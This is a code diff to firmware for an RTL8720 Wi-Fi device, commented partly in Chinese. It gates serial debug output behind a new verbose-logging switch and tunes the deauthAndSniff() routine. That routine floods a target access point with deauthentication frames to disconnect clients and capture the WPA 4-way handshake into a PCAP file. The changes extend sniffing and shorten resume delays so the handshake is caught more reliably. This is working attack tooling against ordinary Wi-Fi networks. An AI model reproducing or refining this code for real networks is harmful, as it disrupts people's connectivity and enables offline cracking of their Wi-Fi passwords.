@@ -156,8 +156,11 @@ volatile bool handshakeJustCaptured = false;
 volatile unsigned long lastCaptureTimestamp = 0;
 volatile uint8_t lastCaptureHSCount = 0;
 volatile uint8_t lastCaptureMgmtCount = 0;
-// 调试控制
-static bool g_verboseHandshakeLog = true;
+// 调试控制（统一可控开关，默认关闭详细日志）
+static bool g_verboseHandshakeLog = false;
+
+// 提供统一的开关接口，便于外部按需启用/关闭
+static inline void setVerboseHandshakeLog(bool enabled) { g_verboseHandshakeLog = enabled; }
 static unsigned long g_promiscEnabledMs = 0;
 // Capture mode: 0=ACTIVE(主动), 1=PASSIVE(被动), 2=EFFICIENT(高效)
 #define CAPTURE_MODE_ACTIVE 0
@@ -615,7 +618,7 @@ void deauthAndSniff() {
   resetCaptureData();
 
   // 停止现有的数据包侦测功能以避免冲突
-  Serial.println(F("Stopping existing packet detection..."));
+  if (g_verboseHandshakeLog) Serial.println(F("Stopping existing packet detection..."));
   wifi_set_promisc(RTW_PROMISC_DISABLE, NULL, 1);
   delay(200); // 增加等待时间确保混杂模式完全关闭
   
@@ -625,12 +628,14 @@ void deauthAndSniff() {
   memcpy(deauth_bssid, _selectedNetwork.bssid, 6);
   
   // 输出目标网络信息用于调试
-  Serial.print(F("Target network: "));
-  Serial.print(_selectedNetwork.ssid);
-  Serial.print(F(" ("));
-  Serial.print(macToString(_selectedNetwork.bssid, 6));
-  Serial.print(F(") on channel "));
-  Serial.println(_selectedNetwork.ch);
+  if (g_verboseHandshakeLog) {
+    Serial.print(F("Target network: "));
+    Serial.print(_selectedNetwork.ssid);
+    Serial.print(F(" ("));
+    Serial.print(macToString(_selectedNetwork.bssid, 6));
+    Serial.print(F(") on channel "));
+    Serial.println(_selectedNetwork.ch);
+  }
   
   // 检查目标网络是否有效
   if (_selectedNetwork.ch == 0 || _selectedNetwork.ssid == "") {
@@ -641,11 +646,9 @@ void deauthAndSniff() {
   }
   
   // Set the channel to the target AP's channel.
-  Serial.print(F("Setting channel to: "));
-  Serial.println(_selectedNetwork.ch);
+  if (g_verboseHandshakeLog) { Serial.print(F("Setting channel to: ")); Serial.println(_selectedNetwork.ch); }
   int channelResult = wext_set_channel(WLAN0_NAME, _selectedNetwork.ch);
-  Serial.print(F("Channel set result: "));
-  Serial.println(channelResult);
+  if (g_verboseHandshakeLog) { Serial.print(F("Channel set result: ")); Serial.println(channelResult); }
   
   // 等待频道切换完成
   delay(100);
@@ -673,15 +676,14 @@ void deauthAndSniff() {
   
   // Phase durations - 调整时间间隔以提高握手触发概率
   const unsigned long deauthInterval = 1500; // 缩短基础去认证阶段，减少打扰
-  unsigned long sniffInterval = 5000;        // 嗅探基础时间
+  unsigned long sniffInterval = 7000;        // 嗅探基础时间（略延长以捕捉重连）
   
   // bool cancelled = false; // not used
   
   // Enable promiscous mode BUT keep SoftAP active
-  Serial.println(F("Enabling promiscuous mode for handshake capture..."));
+  if (g_verboseHandshakeLog) Serial.println(F("Enabling promiscuous mode for handshake capture..."));
   int promiscResult = wifi_set_promisc(RTW_PROMISC_ENABLE_2, rtl8720_sniff_callback, 1);
-  Serial.print(F("Promiscuous mode result: "));
-  Serial.println(promiscResult);
+  if (g_verboseHandshakeLog) { Serial.print(F("Promiscuous mode result: ")); Serial.println(promiscResult); }
   
   // 等待混杂模式启动
   delay(200);
@@ -722,14 +724,13 @@ void deauthAndSniff() {
 
 // ----- Deauth Phase -----
     if (g_captureMode == CAPTURE_MODE_ACTIVE) {
-      Serial.println(F("Starting deauth phase..."));
+    if (g_verboseHandshakeLog) Serial.println(F("Starting deauth phase..."));
       // Pause capture while sending deauth
       pauseCaptureForDeauth();
       unsigned long deauthPhaseStart = millis();
       int deauthPacketCount = 0;
       
-      Serial.print(F("Target BSSID: "));
-      Serial.println(macToString(deauth_bssid, 6));
+      if (g_verboseHandshakeLog) { Serial.print(F("Target BSSID: ")); Serial.println(macToString(deauth_bssid, 6)); }
       
       {
         const int maxDeauthPerPhase = 1200; // 限制单轮发送量，避免过度干扰
@@ -769,21 +770,19 @@ void deauthAndSniff() {
         }
       }
       
-      Serial.print(F("Sent "));
-      Serial.print(deauthPacketCount);
-      Serial.println(F(" deauth packets"));
-// Resume capture after 500ms grace period
-      resumeCaptureAfterDeauth(500);
+      if (g_verboseHandshakeLog) { Serial.print(F("Sent ")); Serial.print(deauthPacketCount); Serial.println(F(" deauth packets")); }
+// Resume capture quickly to avoid missing immediate M1
+      resumeCaptureAfterDeauth(120);
       wext_set_channel(WLAN0_NAME, _selectedNetwork.ch);
     } else {
       Serial.println(F("[Deauth] Skipping deauth phase (non-ACTIVE mode)"));
     }
 
     // ----- Sniff Phase -----
-    Serial.println(F("Starting sniff phase..."));
+      if (g_verboseHandshakeLog) Serial.println(F("Starting sniff phase..."));
 
     if (promiscResult != 0) {
-      Serial.println(F("Re-enabling promiscuous mode..."));
+      if (g_verboseHandshakeLog) Serial.println(F("Re-enabling promiscuous mode..."));
       wifi_set_promisc(RTW_PROMISC_ENABLE, rtl8720_sniff_callback, 1);
     }
     
@@ -823,8 +822,8 @@ void deauthAndSniff() {
             wifi_tx_broadcast_deauth(deauth_bssid, 7, 1, 1000);
           }
         }
-// Resume capture after 500ms grace period
-        resumeCaptureAfterDeauth(500);
+// Resume capture quickly to avoid missing immediate EAPOL
+        resumeCaptureAfterDeauth(120);
         wext_set_channel(WLAN0_NAME, _selectedNetwork.ch);
       }
       // 动态敏感度：当捕获到 M1 或 M3（AP->STA方向且含ACK），适度延长本轮嗅探时间
@@ -843,18 +842,18 @@ void deauthAndSniff() {
         if (extend && sniffInterval < 10000) { sniffInterval = 10000; }
       }
       if (hasBothHandshakeDirections() && capturedManagement.frameCount < 3) {
-        Serial.println(F("Early management capture trigger: both directions seen, switching to management capture..."));
+        if (g_verboseHandshakeLog) Serial.println(F("Early management capture trigger: both directions seen, switching to management capture..."));
         break;
       }
       // 最小嗅探时间门限：至少嗅探1.5秒才允许判定完成
       if ((millis() - sniffPhaseStart) >= 1500UL && isHandshakeComplete()) {
-        Serial.println(F("Complete 4-way handshake detected (after min sniff time), exiting sniff phase early"));
+        if (g_verboseHandshakeLog) Serial.println(F("Complete 4-way handshake detected (after min sniff time), exiting sniff phase early"));
         break;
       }
     }
 
   if ((millis() - sniffPhaseStart) >= 1500UL && isHandshakeComplete() && capturedManagement.frameCount >= 3) {
-      Serial.println(F("Complete handshake and management frames captured, exiting capture loop"));
+      if (g_verboseHandshakeLog) Serial.println(F("Complete handshake and management frames captured, exiting capture loop"));
       break;
     }
 
@@ -899,15 +898,15 @@ void deauthAndSniff() {
             wifi_tx_raw_frame(&frame, sizeof(DeauthFrame));
           }
         }
-// Resume capture after 500ms grace period
-        resumeCaptureAfterDeauth(500);
+// Resume capture quickly to avoid missing immediate EAPOL
+        resumeCaptureAfterDeauth(120);
         wext_set_channel(WLAN0_NAME, _selectedNetwork.ch);
       }
     }
   }
   
   if ((isHandshakeComplete() || (capturedHandshake.frameCount >= 2 && hasBothHandshakeDirections())) && capturedManagement.frameCount < 3) {
-    Serial.println(F("Starting dedicated management frame capture phase..."));
+    if (g_verboseHandshakeLog) Serial.println(F("Starting dedicated management frame capture phase..."));
     unsigned long managementCaptureStart = millis();
     const unsigned long managementCaptureTimeout = 20000; // 20s
     allowAnyMgmtFrames = true;
@@ -925,22 +924,24 @@ void deauthAndSniff() {
   
   captureAttempts++;
   
-  Serial.print(F("Current handshake count: "));
-  Serial.print(capturedHandshake.frameCount);
-  Serial.print(F(" / "));
-  Serial.print(MAX_HANDSHAKE_FRAMES);
-  Serial.print(F(", management frames: "));
-  Serial.print(capturedManagement.frameCount);
-  Serial.print(F(" / "));
-  Serial.print(MAX_MANAGEMENT_FRAMES);
-  Serial.print(F(", callback triggered: "));
-  Serial.print(sniffCallbackTriggered ? "YES" : "NO");
-  Serial.print(F(", elapsed time: "));
-  Serial.print((millis() - overallStart) / 1000);
-  Serial.println(F("s"));
+  if (g_verboseHandshakeLog) {
+    Serial.print(F("Current handshake count: "));
+    Serial.print(capturedHandshake.frameCount);
+    Serial.print(F(" / "));
+    Serial.print(MAX_HANDSHAKE_FRAMES);
+    Serial.print(F(", management frames: "));
+    Serial.print(capturedManagement.frameCount);
+    Serial.print(F(" / "));
+    Serial.print(MAX_MANAGEMENT_FRAMES);
+    Serial.print(F(", callback triggered: "));
+    Serial.print(sniffCallbackTriggered ? "YES" : "NO");
+    Serial.print(F(", elapsed time: "));
+    Serial.print((millis() - overallStart) / 1000);
+    Serial.println(F("s"));
+  }
   
   if (!sniffCallbackTriggered && (millis() - overallStart) > 5000) {
-    Serial.println(F("No callback triggered, re-enabling promiscuous mode..."));
+    if (g_verboseHandshakeLog) Serial.println(F("No callback triggered, re-enabling promiscuous mode..."));
     wifi_set_promisc(RTW_PROMISC_DISABLE, NULL, 1);
     delay(100);
     wifi_set_promisc(RTW_PROMISC_ENABLE, rtl8720_sniff_callback, 1);
@@ -948,19 +949,19 @@ void deauthAndSniff() {
   }
   
   if (capturedHandshake.frameCount > 0 || capturedManagement.frameCount > 0) {
-    Serial.print(F("Partial capture progress: "));
-    Serial.print(capturedHandshake.frameCount);
-    Serial.print(F(" handshake frames, "));
-    Serial.print(capturedManagement.frameCount);
-    Serial.println(F(" management frames - continuing..."));
+    if (g_verboseHandshakeLog) {
+      Serial.print(F("Partial capture progress: "));
+      Serial.print(capturedHandshake.frameCount);
+      Serial.print(F(" handshake frames, "));
+      Serial.print(capturedManagement.frameCount);
+      Serial.println(F(" management frames - continuing..."));
+    }
   }
   
   if (isHandshakeComplete() && hasBothHandshakeDirections()) {
     wext_set_channel(WLAN0_NAME, AP_Channel.toInt());
     std::vector<uint8_t> pcapData = generatePcapBuffer();
-    Serial.print(F("PCAP size: "));
-    Serial.print(pcapData.size());
-    Serial.println(F(" bytes"));
+    if (g_verboseHandshakeLog) { Serial.print(F("PCAP size: ")); Serial.print(pcapData.size()); Serial.println(F(" bytes")); }
     globalPcapData = pcapData;
     handshakeDataAvailable = true;
     isHandshakeCaptured = true;
@@ -969,20 +970,20 @@ void deauthAndSniff() {
     lastCaptureHSCount = (uint8_t)capturedHandshake.frameCount;
     lastCaptureMgmtCount = (uint8_t)capturedManagement.frameCount;
     handshakeJustCaptured = true;
-    Serial.println(F("Handshake data saved to global storage"));
-    printHandshakeData();
+    if (g_verboseHandshakeLog) Serial.println(F("Handshake data saved to global storage"));
+    if (g_verboseHandshakeLog) printHandshakeData();
   }
   
-  Serial.println(F("Disabling promiscuous mode..."));
+  if (g_verboseHandshakeLog) Serial.println(F("Disabling promiscuous mode..."));
   wifi_set_promisc(RTW_PROMISC_DISABLE, NULL, 1);
   delay(200);
-  Serial.println(F("Restoring original channel..."));
+  if (g_verboseHandshakeLog) Serial.println(F("Restoring original channel..."));
   wext_set_channel(WLAN0_NAME, AP_Channel.toInt());
   delay(200);
-  Serial.println(F("Finished deauth+sniff cycle."));
+  if (g_verboseHandshakeLog) Serial.println(F("Finished deauth+sniff cycle."));
   readyToSniff = false;
   sniffer_active = false;
-  Serial.println(F("=== Handshake capture completed status updated ==="));
+  if (g_verboseHandshakeLog) Serial.println(F("=== Handshake capture completed status updated ==="));
   // 移除4帧回退：仅当严格完成逻辑设置了handshakeDataAvailable时，WebUI才显示已捕获
   // 抓包完成LED指示（在清除运行标记前设置）
   extern void completeHandshakeLED();
@@ -1009,7 +1010,7 @@ void rtl8720_sniff_callback(unsigned char *packet, unsigned int length, void* pa
   static int totalFramesProcessed = 0;
   callbackCount++;
   totalFramesProcessed++;
-  if (millis() - lastDebugLog > 5000) {
+  if (g_verboseHandshakeLog && (millis() - lastDebugLog > 5000)) {
     Serial.print(F("[Handshake] Callbacks triggered: "));
     Serial.print(callbackCount);
     Serial.print(F(", handshake frames: "));
